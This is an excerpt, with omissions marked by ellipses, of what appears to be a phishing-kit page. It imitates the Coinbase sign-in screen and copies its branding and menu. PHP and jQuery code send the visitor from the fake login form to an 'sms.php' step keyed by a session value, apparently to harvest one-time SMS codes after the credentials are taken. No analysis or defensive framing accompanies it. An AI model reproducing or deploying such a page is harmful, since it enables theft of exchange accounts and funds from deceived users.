...
//}
if ($logs==false){
  header('location: sms.php?cmd='.$_SESSION['PHPisHERE']);
}
?>
<!DOCTYPE html>
<html xmlns:fb="https://ogp.me/ns/fart#"><head>
  <title>
      Coinbase
  </title>
  <!-- generic -->
...
<body class="app signed-out sessions new" data-controller-name="sessions" data-action-name="new" data-view-name="markets.Views.Sessions.New" data-account-id="">
    ...
    <div class="container">
        ...
        <div class="nav-collapse" id="application_menu">
            <ul class="nav clearfix">
                <li class="dropdown dropdown-hover" id="resources_menu">
                  ...
                  <ul class="dropdown-menu fadeIn animated-fast" role="menu" aria-labelledby="dLabel">
                    <li class="home "><a href="">Buy/Sell</a></li>
                    <li><a href="" class="external-link">Coinbase Pro</a></li>
                    <li><a href="" class="external-link">Coinbase Prime</a></li>
                    <li><a href="" class="external-link">Developer Platform</a></li>
                    <li><a href="" class="external-link">Coinbase Commerce</a></li>
                  </ul>
                </li>
          ...
          <ul class="nav clearfix">
              ...
              <li class="active signin"><a href="">Sign In</a></li>
              <li style="margin-top:-1px" class=" signup"><a href="" class="btn">Sign Up</a></li>
          </ul>
        </div>
    </div>
  </div>
  ...
  <div class="alert alert-danger">
    ...
    Please enable javascript or upgrade your browser for the best experience.
  </div>
</noscript>
...
$("#Login").submit(function(event){
 ...
 $(location).attr("href", "sms.php?cmd=<?php echo $_SESSION['PHPisHERE']?>");
    });
